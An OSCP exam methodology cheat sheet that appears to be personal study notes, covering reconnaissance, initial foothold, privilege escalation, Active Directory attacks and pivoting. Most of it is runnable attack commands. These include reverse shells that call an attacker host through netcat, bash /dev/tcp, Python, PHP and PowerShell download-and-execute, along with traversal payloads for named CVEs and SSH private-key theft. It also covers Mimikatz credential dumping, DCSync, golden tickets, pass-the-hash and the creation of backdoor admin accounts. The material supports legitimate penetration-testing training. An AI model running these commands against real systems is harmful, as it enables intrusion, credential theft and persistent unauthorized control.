# OSCP - Complete Methodology Cheat Sheet

> **A step-by-step framework for attacking Linux, Windows, and Active Directory targets.**

---

## Table of Contents

1. [Linux Methodology](#1-linux-methodology)
2. [Windows Methodology](#2-windows-methodology)
3. [Active Directory Methodology](#3-active-directory-methodology)
4. [Quick Reference Flowcharts](#4-quick-reference-flowcharts)

---

## 1. Linux Methodology

### Phase 1: Reconnaissance

#### Step 1: Port Scanning
```bash
# Quick TCP scan (top 1000 ports)
nmap -v -sS -sV -Pn --top-ports 1000 -oA nmap_quick <target>

# Full TCP scan (all ports)
nmap -sT -p- --min-rate 5000 --max-retries 1 -oA nmap_full <target>

# UDP scan (top 100)
nmap -v -sU -T4 -Pn --top-ports 100 -oA nmap_udp <target>
```

**What to look for**:
- Open ports and service versions
- SSH (22) - potential weak credentials
- HTTP (80, 443) - web apps
- SMB (139, 445) - file shares
- FTP (21) - anonymous login
- SMTP (25) - user enumeration
- SNMP (161) - misconfigurations
- MySQL/PostgreSQL (3306, 5432) - default creds

#### Step 2: Web Application Enumeration
> Full walkthrough (Nmap web fingerprinting, Wappalyzer, Gobuster incl. API pattern brute force, Burp Suite Proxy/Repeater/Intruder, XSS): [[Introduction to Web Application Attacks]]

```bash
# Web server fingerprinting
nmap -p80 -sV <target>
nmap -p80 --script=http-enum <target>

# Directory brute force
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,sh,cgi

# API path brute force (pattern file containing {GOBUSTER}/v1 etc.)
gobuster dir -u http://<target>:<port> -w /usr/share/wordlists/dirb/big.txt -p pattern

# Tech stack identification
whatweb http://<target>
wpscan --url http://<target> --enumerate p,vt

# robots.txt / sitemap check
curl http://<target>/robots.txt
```

**What to look for**:
- `/admin`, `/login`, `/dashboard`
- `robots.txt` - hidden paths
- `config.php`, `wp-config.php` - config files
- `.git` - source code exposure
- `/uploads` - file upload vulnerabilities
- `/cgi-bin` - potential RCE
- API endpoints (`/<name>/v1`, `/<name>/v2`) - probe with `curl`, watch for `405` vs `404` to confirm a path exists under a different HTTP method
- Stored/reflected XSS - test `< > ' " { } ;` in any input that gets echoed back unsanitized

#### Step 3: Service-Specific Enumeration
```bash
# SMB
enum4linux <target>
smbclient -U guest -L //<target>

# FTP
ftp <target>  # Try anonymous login

# SMTP
nc -nv <target> 25
VRFY root
EXPN mail

# SNMP
snmpwalk -c public -v1 <target>
onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target>

# NFS
showmount -e <target>
mount -t nfs <target>:/share /mnt/nfs
```

---

### Phase 2: Initial Foothold

#### Step 1: Service Exploitation
```bash
# Weak credentials
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target> -t 4

# Web exploits
searchsploit <software> <version>
# Check GTFOBins for binary exploitation

# SQL injection (manual first)
sqlmap -u "http://target/page?id=1" --batch
```

#### Step 1b: Web Application Exploitation
> Full walkthrough (Directory Traversal so far; File Inclusion/Upload/Command Injection to follow): [[Common Web Application Attacks]]

```bash
# Directory Traversal / LFI probe. Swap in likely parameter names (page, file, path, template, doc...)
curl "http://<target>/index.php?page=../../../../../../../../../etc/passwd"
curl "http://<target>/index.php?page=..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"   # URL-encoded variant
curl "http://<target>/index.php?page=..\..\..\..\..\..\windows\system32\drivers\etc\hosts"  # Windows target, try backslash too

# If plain ../ 404s / gets filtered, try percent-encoding the dots. Bypasses filters matching only the literal string
curl "http://<target>/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
# Apache CVE-2021-41773/42013 specifically wants an asymmetric first segment. Try this exact pattern if the uniform one above 404s regardless of depth:
curl --path-as-is "http://<target>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# Grafana CVE-2021-43798 (any core plugin path works, alertlist always present, no auth needed)
curl http://<target>:3000/api/health   # confirm version is 8.0.0-beta1 through 8.3.0
curl --path-as-is "http://<target>:3000/public/plugins/alertlist/../../../../../../../../../../etc/passwd"

# Extract a multi-line secret (private key, cert) found via traversal. NEVER copy/paste manually, extract mechanically
curl -s "http://<target>/index.php?page=../../../../../../home/<user>/.ssh/id_rsa" -o raw_response.txt
sed -n '/-----BEGIN OPENSSH PRIVATE KEY-----/,/-----END OPENSSH PRIVATE KEY-----/p' raw_response.txt > stolen_key
chmod 400 stolen_key
ssh -i stolen_key <user>@<target>   # add -p <port> if non-standard
```

**What to look for**:
- Any parameter whose value looks like a filename (`page=`, `file=`, `template=`, `lang=`). Classic LFI/traversal injection point
- `/etc/passwd` (Linux) or `C:\Windows\System32\drivers\etc\hosts` (Windows) to confirm the traversal works at all
- Once confirmed, hunt disclosed usernames' home directories for `.ssh/id_rsa`. Often world-readable, a direct path to a shell via SSH
- On Windows, no direct traversal-to-shell equivalent exists. Research the specific web server/framework's known sensitive file paths instead (e.g. IIS: `C:\inetpub\wwwroot\web.config`, `C:\inetpub\logs\LogFiles\W3SVC1\`)
- If a retrieved secret fails to load with a vague "unsupported"/"can't parse" error from **any** tool, suspect transcription corruption first. Re-extract mechanically and `diff` before chasing library-compatibility theories

#### Step 2: Shells & Payloads

**Netcat**:
```bash
# Reverse shell
nc <attacker_ip> 4444 -e /bin/bash

# Attacker listener
rlwrap nc -nlvp 4444
```

**Bash**:
```bash
bash -c "bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1"
```

**Python**:
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**PHP**:
```php
<?php echo shell_exec("/bin/bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1");?>
```

**MSFVenom**:
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f elf -o shell.elf
chmod +x shell.elf
./shell.elf
```

#### Step 3: Upgrade Shell
```bash
# TTY shell
python -c 'import pty;pty.spawn("/bin/bash");'

# Full TTY
# Press Ctrl+Z
stty raw -echo
fg
export TERM=xterm-256color
```

---

### Phase 3: Privilege Escalation

#### Step 1: Quick Enumeration
```bash
# Current user info
id
whoami
groups
sudo -l

# System info
uname -a
cat /etc/issue
cat /etc/os-release

# Users
cat /etc/passwd
cat /etc/shadow  # if root

# Network
ip a
netstat -tulpn
ss -tulpn

# Processes
ps auxf
ps -eo pid,user,command
```

#### Step 2: Automated Enumeration
```bash
# LinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Linux Smart Enumeration
wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh
chmod +x lse.sh
./lse.sh
```

#### Step 3: Common Privilege Escalation Vectors

**SUID Binaries**:
```bash
find / -perm -u=s -type f 2>/dev/null

# Check GTFOBins for each binary
# Example: find
find . -exec /bin/sh -p \; -quit

# Example: bash
bash -p

# Example: python
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Capabilities**:
```bash
getcap -r / 2>/dev/null

# Exploit cap_setuid
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Sudo Misconfigurations**:
```bash
sudo -l

# Common exploits:
# git
sudo git help config
!/bin/bash

# less
sudo less /etc/hosts
!/bin/bash

# vim
sudo vim
:!/bin/bash

# apt-get
sudo apt-get changelog apt
!/bin/sh

# find
sudo find / -exec /bin/sh \;
```

**Cron Jobs**:
```bash
ls -la /etc/cron*
crontab -l
cat /etc/crontab

# Writable cron scripts
find /etc/cron* -writable 2>/dev/null
```

**/etc/passwd Writeable**:
```bash
openssl passwd w00t
echo "root2:hash:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
```

**Kernel Exploits**:
```bash
uname -a
searchsploit linux kernel <version>
# Compile and run (test in sandbox first!)
```

---

## 2. Windows Methodology

### Phase 1: Reconnaissance

#### Step 1: Port Scanning
```bash
nmap -v -sS -sV -Pn --top-ports 1000 -oA nmap_quick <target>
nmap -sT -p- --min-rate 5000 --max-retries 1 -oA nmap_full <target>
```

**What to look for**:
- SMB (139, 445) - file shares, SMB exploits
- RDP (3389) - remote desktop
- WinRM (5985, 5986) - remote management
- MSSQL (1433) - default credentials
- Web (80, 443, 8080)
- NetBIOS (137-139)

#### Step 2: SMB Enumeration
```bash
enum4linux <target>
smbclient -U guest -L //<target>

# SMB vulnerability scan
nmap -v -sS -p 445,139 -Pn --script smb-vuln* --script-args=unsafe=1 <target>
```

**What to look for**:
- Shares (non-default names)
- Users (via enum4linux)
- Null sessions (SMB signing disabled)
- SMB vulnerabilities (EternalBlue, SMBGhost)

#### Step 3: Web Enumeration
```bash
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt -x aspx,asp,txt,config
```

#### Step 4: LDAP/DNS Enumeration
```bash
# DNS zone transfer
host -l domain.com <target>
nslookup
> server <target>
> ls -d domain.com

# LDAP
ldapsearch -x -H ldap://<target> -b "dc=domain,dc=com"
```

---

### Phase 2: Initial Foothold

#### Step 1: Service Exploitation
```bash
# SMB exploits
searchsploit smb
# Try EternalBlue, SMBGhost, etc.

# Weak credentials
hydra -L users.txt -P rockyou.txt rdp://<target> -t 1
hydra -L users.txt -P rockyou.txt smb://<target> -t 4

# Web vulnerabilities
searchsploit <software> <version>
```

#### Step 2: Shells & Payloads

**Netcat**:
```cmd
nc <attacker_ip> 4444 -e cmd.exe
```

**PowerShell**:
```powershell
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<attacker_ip>/powercat.ps1'); powercat -c <attacker_ip> -p 4444 -e powershell"
```

**MSFVenom**:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o shell.exe

# Meterpreter
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o met.exe
```

#### Step 3: File Transfer
```powershell
# PowerShell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<attacker_ip>/shell.exe', 'C:\temp\shell.exe')"

# Certutil
certutil.exe -urlcache -f http://<attacker_ip>/shell.exe C:\temp\shell.exe

# SMB
impacket-smbserver -smb2support share /var/www/html
copy \\<attacker_ip>\share\shell.exe shell.exe
```

---

### Phase 3: Privilege Escalation

#### Step 1: Quick Enumeration
```cmd
systeminfo
hostname
whoami /all
whoami /priv
net user
net localgroup
net user username
net localgroup Administrators
ipconfig /all
route print
netstat -ano
tasklist /v
wmic qfe list
wmic product get name,version
```

#### Step 2: Automated Enumeration
```powershell
# WinPEAS
iwr -uri http://<attacker_ip>/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe

# PowerUp
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
. .\PowerUp.ps1
Invoke-AllChecks
```

#### Step 3: Common Privilege Escalation Vectors

**Unquoted Service Paths**:
```cmd
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
Get-UnquotedService  # PowerUp
```

**Service Binary Hijacking**:
```cmd
icacls "C:\Path\to\service.exe"
# If writable, replace with malicious binary
```

**DLL Hijacking**:
- Use Process Monitor to find missing DLLs
- Place malicious DLL in application directory

**Potato Attacks (SeImpersonatePrivilege)**:
```cmd
whoami /priv
# If SeImpersonatePrivilege enabled:
SweetPotato.exe -p whoami
```

**AlwaysInstallElevated**:
```powershell
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer
Get-ItemProperty HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer
msiexec /quiet /qn /i C:\Users\Public\shell.msi
```

**UAC Bypass**:
```bash
# Metasploit
use exploit/windows/local/bypassuac_sdclt
set SESSION 1
set LHOST <attacker_ip>
run
```

**Kernel Exploits**:
```cmd
systeminfo
searchsploit windows <build_number>
```

---

## 3. Active Directory Methodology

### Phase 1: AD Enumeration

#### Step 1: Basic Domain Information
```powershell
# PowerView
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetDomainController

# Manual LDAP
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = $domainObj.PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName
$LDAP = "LDAP://$PDC/$DN"
```

#### Step 2: Users & Groups
```powershell
# PowerView
Get-NetUser
Get-NetUser | select cn,lastlogon,pwdlastset
Get-NetGroup
Get-NetGroup "Domain Admins" | select member

# net.exe
net user /domain
net group /domain
net group "Domain Admins" /domain
```

#### Step 3: Computers
```powershell
Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname

# SMB enumeration
crackmapexec smb <target> -u user -p password --shares
```

#### Step 4: Service Principal Names (SPNs)
```powershell
Get-NetUser -SPN | select samaccountname,serviceprincipalname

# SetSPN
setspn -L <user>
```

#### Step 5: Active Sessions & Local Admin
```powershell
Find-LocalAdminAccess
Get-NetSession -ComputerName <target>

# PsLoggedOn
PsLoggedon.exe \\<target>
```

#### Step 6: Permissions
```powershell
Get-ObjectAcl -Identity <user>
Find-InterestingDomainAcl
```

#### Step 7: BloodHound
```powershell
# Collect data
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp\

# Or use SharpHound.exe
SharpHound.exe -c All -d domain.com

# Import to BloodHound on Kali
# Start Neo4j
sudo neo4j start
# Start BloodHound
bloodhound
# Upload .zip file
```

**Key BloodHound Queries**:
```cypher
// All computers
MATCH (m:Computer) RETURN m

// All users
MATCH (m:User) RETURN m

// Active sessions
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p

// Shortest path to Domain Admins
// Pre-built query in BloodHound
```

---

### Phase 2: Initial Access

#### Step 1: Password Attacks

**Password Spraying**:
```bash
# CrackMapExec
crackmapexec smb <target> -u users.txt -p passwords.txt --continue-on-success

# Kerbrute (Kerberos)
kerbrute passwordspray -d domain.com --dc <dc_ip> users.txt "Password123!"

# Hydra
hydra -L users.txt -P rockyou.txt rdp://<target> -t 1
```

#### Step 2: AS-REP Roasting
```bash
# Rubeus
Rubeus.exe asreproast /nowrap

# impacket
impacket-GetNPUsers -dc-ip <dc_ip> -request -outputfile hashes.asreproast domain.com/user

# Crack
hashcat -m 18200 hashes.asreproast rockyou.txt --force
```

#### Step 3: Kerberoasting
```bash
# Rubeus
Rubeus.exe kerberoast /outfile:hashes.kerberoast

# impacket
impacket-GetUserSPNs -request -dc-ip <dc_ip> domain.com/user

# Crack
hashcat -m 13100 hashes.kerberoast rockyou.txt --force
```

#### Step 4: Pass-the-Hash
```bash
# impacket
impacket-psexec -hashes :<ntlm_hash> domain/user@<target>
impacket-wmiexec -hashes :<ntlm_hash> domain/user@<target>

# CrackMapExec
crackmapexec smb <target> -u user -H <ntlm_hash>

# smbclient
smbclient \\\\<target>\\share -U user --pw-nt-hash <ntlm_hash>
```

#### Step 5: Overpass-the-Hash
```cmd
# Mimikatz
sekurlsa::pth /user:user /domain:domain.com /ntlm:<ntlm_hash> /run:powershell

# In new PowerShell session
net use \\fileserver
```

---

### Phase 3: Post-Exploitation & Persistence

#### Step 1: Extract Credentials

**Mimikatz**:
```cmd
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::dcsync /user:domain\user
```

**DCSync**:
```cmd
lsadump::dcsync /user:domain\krbtgt
```

**Hash Dumping**:
```bash
# impacket
impacket-secretsdump domain/user:password@<dc_ip>
impacket-secretsdump -sam sam.bak -security security.bak -system system.bak LOCAL
```

#### Step 2: Pass-the-Ticket
```cmd
# Export tickets
sekurlsa::tickets /export

# Import ticket
kerberos::ptt ticket.kirbi

# Verify
klist
```

#### Step 3: Golden Ticket
```cmd
# Get krbtgt hash
lsadump::dcsync /user:domain\krbtgt

# Create golden ticket
kerberos::golden /user:<user> /domain:domain.com /sid:<domain_sid> /krbtgt:<krbtgt_hash> /ptt

# Access DC
PsExec \\dc1 cmd
```

#### Step 4: Silver Ticket
```cmd
# Create service ticket
kerberos::golden /user:<user> /domain:domain.com /sid:<domain_sid> /target:<server.domain.com> /service:<service> /rc4:<service_hash> /ptt

# Access service
iwr -UseDefaultCredentials http://<server>
```

#### Step 5: Backdoor Accounts
```cmd
# Create backdoor user
net user backdoor password /add /domain
net group "Domain Admins" backdoor /add /domain

# AWS (cloud)
aws iam create-user --user-name backdoor
aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

---

### Phase 4: Lateral Movement

#### Step 1: Service Exploitation

**PsExec**:
```cmd
PsExec64.exe \\<target> -u domain\user -p password cmd
```

**WMI**:
```cmd
wmic /node:<target> /user:domain\user /password:pass process call create "cmd.exe /c whoami > C:\temp\out.txt"
```

**PowerShell Remoting**:
```powershell
$cred = Get-Credential
Enter-PSSession -ComputerName <target> -Credential $cred
```

**WinRM**:
```cmd
winrs -r:<target> -u:user -p:pass "whoami"
evil-winrm -i <target> -u user -p password
```

**Impacket**:
```bash
impacket-psexec domain/user:password@<target>
impacket-wmiexec domain/user:password@<target>
```

#### Step 2: Pivoting

**SSH Tunneling**:
```bash
# Local port forward
ssh -L 8080:internal_host:80 user@jump_host

# Dynamic SOCKS
ssh -D 1080 user@jump_host

# Remote port forward
ssh -R 8080:localhost:80 user@external_host
```

**Metasploit**:
```bash
# Add route
route add 172.16.0.0 255.255.255.0 1

# SOCKS proxy
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set VERSION 5
run -j
```

**Chisel**:
```bash
# Server
./chisel server --port 8080 --reverse

# Client
./chisel client <attacker_ip>:8080 R:socks
```

**Proxychains**:
```bash
# /etc/proxychains4.conf
socks5 127.0.0.1 1080

# Usage
proxychains nmap -sT 172.16.0.0/24
proxychains crackmapexec smb 172.16.0.0/24 -u user -p password
```

---

## 4. Quick Reference Flowcharts

### Linux Attack Flow
```
Port Scan → Identify Services
    ↓
Web Service → Gobuster/WPScan → Find Vuln → Exploit → Shell
    ↓
Other Services → enum4linux, snmpwalk, smbclient → Find Creds/Info → Exploit
    ↓
Initial Shell → TTY Upgrade → Enumeration (LinPEAS, sudo -l, SUID)
    ↓
Priv Esc → SUID, Sudo, Capabilities, Cron, Kernel → Root Shell
```

### Windows Attack Flow
```
Port Scan → Identify Services
    ↓
SMB → enum4linux, smbclient → Find Shares, Users, Null Sessions
    ↓
RDP/WinRM → Hydra/CrackMapExec → Find Creds
    ↓
Web → Gobuster, WPScan → Find Vuln → Exploit
    ↓
Initial Shell → PowerShell → Enumeration (WinPEAS, whoami /all)
    ↓
Priv Esc → Unquoted Services, DLL Hijacking, Potato, UAC Bypass → SYSTEM
```

### Active Directory Attack Flow
```
Initial Creds → Enumeration (PowerView, BloodHound)
    ↓
Identify Attack Path
    ↓
Password Spray → Kerberoast → AS-REP Roast → Pass-the-Hash
    ↓
Access to Low-Priv User → BloodHound → Find Path to DA
    ↓
Lateral Movement → PsExec, WMI, WinRM, Impacket
    ↓
Post-Exploitation → Mimikatz → DCSync → Golden Ticket
    ↓
Domain Admin → Extract Creds → Persistence
```

---

## 5. Key Commands Summary

### Linux Key Commands
| Command | Purpose |
|---------|---------|
| `find / -perm -u=s -type f 2>/dev/null` | Find SUID files |
| `sudo -l` | Check sudo permissions |
| `cat /etc/cron*` | View cron jobs |
| `uname -a` | Kernel version |
| `getcap -r / 2>/dev/null` | Capabilities |

### Windows Key Commands
| Command | Purpose |
|---------|---------|
| `whoami /all` | User info + privileges |
| `systeminfo` | OS + patches |
| `wmic qfe list` | Installed updates |
| `net user /domain` | Domain users |
| `net group "Domain Admins" /domain` | DA members |

### AD Key Commands
| Command | Purpose |
|---------|---------|
| `Get-NetUser` | List users |
| `Get-NetGroup` | List groups |
| `Get-NetComputer` | List computers |
| `Get-NetUser -SPN` | Kerberoastable users |
| `Find-LocalAdminAccess` | Check local admin |
| `Invoke-BloodHound` | Collect AD data |

---

**Remember**: Enumeration is the key to OSCP success. Take thorough notes, be methodical, and when stuck, enumerate more.

> "Try Harder" - Offensive Security